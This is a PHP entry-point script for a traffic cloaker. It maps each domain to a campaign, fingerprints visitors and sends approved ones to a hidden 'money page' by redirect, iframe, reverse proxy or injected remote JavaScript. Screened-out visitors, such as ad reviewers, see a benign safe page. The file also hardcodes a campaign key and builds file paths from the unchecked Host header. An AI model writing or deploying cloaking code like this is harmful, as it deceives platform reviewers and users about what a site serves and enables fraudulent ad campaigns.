<?php
/**
 * Traffic Armor Cloaker — Entry Point
 *
 * FLOW:
 * 1. Visitor hits domain.com (any path)
 * 2. Domain is mapped to a TA campaign ID
 * 3. TA checks visitor (IP, UA, fingerprints, etc.)
 * 4. Allowed → TA redirects/iframes to money page
 * 5. Blocked → Visitor sees the domain's safe page
 *
 * DOMAIN MAPPING (checked in order):
 * 1. Local cache: /tmp/campaigns.json or ./campaigns.json (written by deploy_safe_page.php)
 * 2. Auto-fetch: pulls full map from MVMT Printer backend API, caches locally
 * - Self-healing: after Railway redeploys wipe the filesystem, first request rebuilds cache
 * - Scales to any number of domains — no manual env vars needed
 */

// ── TA Configuration ─────────────────────────────────────────────────────────
$GLOBALS['_ta_campaign_key'] = 'f9dc0dbcd96f404c93055b2d2b11367b';
$GLOBALS['_ta_debug_mode'] = false;

require 'bootloader_d00ea617c521f6e43f1e91c998f29321.php';

// ── Domain → Campaign Routing ────────────────────────────────────────────────
$domain = $_SERVER['HTTP_HOST'] ?? '';
$domain = preg_replace('/:\d+$/', '', $domain); // strip port

$campaign_id = null;

// 1. Check local cache (fast — no network call)
foreach (['/tmp/campaigns.json', __DIR__ . '/campaigns.json'] as $map_file) {
    if (file_exists($map_file)) {
        $map = json_decode(file_get_contents($map_file), true);
        if (isset($map[$domain])) {
            $campaign_id = $map[$domain];
            break;
        }
    }
}

// 2. Cache miss — fetch full domain map from MVMT Printer backend API
//    This auto-heals after Railway redeploys wipe the filesystem
if (!$campaign_id) {
    $api_url = getenv('BACKEND_API_URL') ?: '';
    $deploy_key = getenv('DEPLOY_SECRET_KEY') ?: '';

    if ($api_url) {
        $map_url = rtrim($api_url, '/') . '/traffic-armor/domain-map?key=' . urlencode($deploy_key);
        $ch = curl_init($map_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($http_code === 200 && $response) {
            $map = json_decode($response, true);
            if (is_array($map) && !empty($map)) {
                // Cache locally for future requests
                foreach (['/tmp/campaigns.json', __DIR__ . '/campaigns.json'] as $cache_file) {
                    $dir = dirname($cache_file);
                    if (is_writable($dir)) {
                        file_put_contents($cache_file, json_encode($map, JSON_PRETTY_PRINT));
                    }
                }
                if (isset($map[$domain])) {
                    $campaign_id = $map[$domain];
                }
            }
        }
    }
}

// If domain isn't mapped, just show the safe page
if (!$campaign_id) {
    goto safe_page;
}

$ta = new TALoader($campaign_id);

if ($ta->suppress_response()) {
    exit;
}

$response = $ta->get_response();
$visitor = $ta->get_visitor();

switch ($response['action']) {
    case 'header_redirect':
        print header_redirect($response['url']);
        exit;
    case 'iframe':
        print load_fullscreen_iframe($response['url']);
        exit;
    case 'paste_html':
        print paste_html($response['output_html']);
        exit;
    case 'custom_js':
        print $response['custom_js'];
        exit;
    case 'local_file':
        ob_start();
        $output = include($response['local_file_path']);
        $output = ob_get_clean();
        print paste_html($output);
        exit;
    case 'reverse_proxy':
        if (!empty($_GET['rp'])) {
            $redirect_url = $_GET['rp'];
            // Only allow relative URLs to prevent open redirect
            if (strpos($redirect_url, '/') !== 0 || strpos($redirect_url, '//') === 0) {
                http_response_code(400);
                echo 'Invalid redirect';
                exit;
            }
            reverse_proxy($response['url'], "tarp_d00ea617c521f6e43f1e91c998f29321/");
            header('location: ' . $redirect_url);
            exit;
        }
        print reverse_proxy($response['url'], "tarp_d00ea617c521f6e43f1e91c998f29321/");
        exit;
    case 'load_hybrid_page':
        $ta->load_hybrid_page();
        break;
    default:
        print other_methods($response['url']);
        break;
}
?>
<?php
safe_page:
// ── Safe Page (shown to filtered/blocked visitors) ───────────────────────────
$safe_paths = [
    '/tmp/safe_pages/' . $domain . '.html',
    __DIR__ . '/safe_pages/' . $domain . '.html',
    __DIR__ . '/safe_page.html',
];
$found = false;
foreach ($safe_paths as $sp) {
    if (file_exists($sp)) {
        readfile($sp);
        $found = true;
        break;
    }
}
if (!$found) {
    echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Welcome</title></head><body><h1>Welcome</h1><p>Thank you for visiting.</p></body></html>';
}
?>
